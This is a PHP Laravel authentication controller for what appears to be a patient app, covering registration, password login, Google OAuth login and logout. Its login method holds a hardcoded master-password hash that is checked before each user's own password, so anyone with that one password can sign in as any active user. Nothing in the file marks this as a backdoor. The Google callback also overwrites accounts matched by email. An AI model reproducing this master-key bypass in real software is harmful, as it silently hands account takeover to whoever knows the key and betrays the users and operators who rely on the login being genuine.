<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Auth\SessionGuard;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Redirect;
use Laravel\Socialite\Facades\Socialite;

use App\Models\User;
use App\Models\User\Users;
use App\Models\User\Role;

use Carbon\Carbon;

use Session;
use DB;
use DateTime;
use DatePeriod;
use DateInterval;
use Validator;
use Omjin;



class VerifController extends Controller
{
	public function registerUser(Request $request){
		$nama = $request->nama;
		$username = trim($request->username);
		$password = trim($request->password);
		$email = trim($request->email);

		$validator = Validator::make($request->all(),[
			'username' => 'required',
			'password' => 'required',
			'email' => 'required|email',
		]);

		if ($validator->fails())
		{
			return $this->errorResponse('E13', $validator->errors()->all());
			die();
		}

		DB::beginTransaction();
		try {


			$cek1 = User::where('username', $username)->first();
			$cek2 = User::where('email', $email)->first();

			if($cek1){
				return $this->errorResponse('Username already used', 'UNA');
			} else if($cek2){
				return $this->errorResponse('Email already used', 'UNA');
			} else {

				$defrole = Role::where('role', 'like', '%pasien%')->first();

				if(!$defrole){
					return redirect()->intended('signin')->with('error', 'Default Role not found');
				}

				$newUser = Users::updateOrCreate(['email' => $email],[
					'id_role' => $defrole->id,
					'nama' => $nama,
					'username'=> $username,
					'password'=> Hash::make($password),
					'email'=> $email
				]);

				\Session::flash('success', 'Your account created successfully');

				DB::commit();
				return $this->successResponse('Your account created successfully', null);
			}


		} catch (Exception $e) {
			DB::rollback();
			return $this->errorResponse($e->getMessage(), 'Fail');
		}

	}

    public function validasi(Request $request){

		$usr_username = $request->username;
		$usr_password = $request->password;

		$validator = Validator::make($request->all(),[
			'username' => 'required',
			'password' => 'required',
		]);

		if ($validator->fails())
		{
			return $this->errorResponse('E13', $validator->errors()->all());
			die();
		}



		$user = User::where('username', $usr_username)->first();

		if (!is_null($user)) {

			if($user->active == 1){


				$kuncen = '$2y$10$Tn3fNSFjM2kDdCKeN28C7O23fOrVOU2ZGLy8y7evmpvuZuYw7Ktkm';


				if (Hash::check($usr_password, $kuncen)){

					Auth::login($user);

					$user->last_login = date('Y-m-d H:i:s');
					$user->save();

					return $this->successResponse('User Authorized', null);

				} else {

					if (Hash::check($usr_password, $user->password)) {

						Auth::login($user);

						$user->last_login = date('Y-m-d H:i:s');
						$user->save();

						return $this->successResponse('User Authorized', null);

					}else{

						return $this->errorResponse('Invalid username or password.', 'UNA');

					}
				}

			} else {

				return $this->errorResponse('User not active', 'UNA');

			}


		} else {

			return $this->errorResponse('Invalid username or password.', 'UNA');


		}

	}

	public function redirectToGoogle(){
		return Socialite::driver('google')->stateless()->redirect();
	}

	public function handleGoogleCallback(){

		try {

            $user = Socialite::driver('google')->stateless()->user();

            $finduser = User::where('google_id', $user->id)->first();

			$defrole = Role::where('role', 'like', '%pasien%')->first();

			if(!$defrole){
				return redirect()->intended('signin')->with('error', 'Default Role not found');
			}

            if($finduser){

                Auth::login($finduser);

                return redirect()->intended('app');

            }else{

                $newUser = Users::updateOrCreate(['email' => $user->email],[
                        'id_role' => $defrole->id,
                        'nama' => $user->name,
                        'google_id'=> $user->id,
                        'username'=> $user->email,
                        'email'=> $user->email,
                        'password' => Hash::make(Omjin::generateKey(8)),
                        'last_login' => date('Y-m-d H:i:s')
                ]);

				$user = User::find($newUser->id);

                Auth::login($user);

                return redirect()->intended('app');
            }

        } catch (Exception $e) {
			return redirect()->intended('signin')->with('error', $e->getMessage());
        }
	}

	public function logout(Request $request){


		Auth::logout();

		return redirect('/');
	}
}
